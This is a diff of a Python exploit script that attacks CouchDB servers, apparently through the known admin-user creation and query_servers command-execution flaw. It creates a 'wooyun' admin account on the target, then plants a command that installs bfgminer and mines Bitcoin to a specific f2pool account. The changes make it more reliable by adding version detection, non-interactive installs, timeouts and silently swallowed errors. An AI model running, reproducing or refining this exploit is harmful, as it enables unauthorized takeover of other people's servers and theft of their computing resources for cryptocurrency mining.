@@ -6,9 +6,10 @@ print(sys.argv[1])
 
 
 target = 'http://'+sys.argv[1]+':5984'
-command = 'nohup ```apt-get install bfgminer ; bfgminer -o  stratum+tcp://btc.f2pool.com:3333 -u prctblminimum2.cdba'+sys.argv[2]+' -p uqkrubeatswv ``` > /dev/null'
+command = 'nohup ```apt-get update; apt-get install bfgminer -y ; bfgminer -o  stratum+tcp://btc.f2pool.com:3333 -u prctblminimum2.cdba'+sys.argv[2]+' -p uqkrubeatswv ``` > /dev/null'
 version = 1
-
+v = requests.get(target).json()["version"]
+version = int(v[0])
 session = requests.session()
 session.headers = {
     'Content-Type': 'application/json'
@@ -23,13 +24,14 @@ session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
 }''')
 
 session.auth = HTTPBasicAuth('wooyun', 'wooyun')
-
-if version == 1:
-    session.put(target + ('/_config/query_servers/cmd'), data=command)
-else:
-    host = session.get(target + '/_membership').json()['all_nodes'][0]
-    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command)
-
+try :
+    if version == 1:
+        session.put(target + ('/_config/query_servers/cmd'), data=command, timeout=3)
+    else:
+        host = session.get(target + '/_membership').json()['all_nodes'][0]
+        session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command, timeout=3)
+except:
+    a=""
 session.put(target + '/wooyun')
 session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')
 
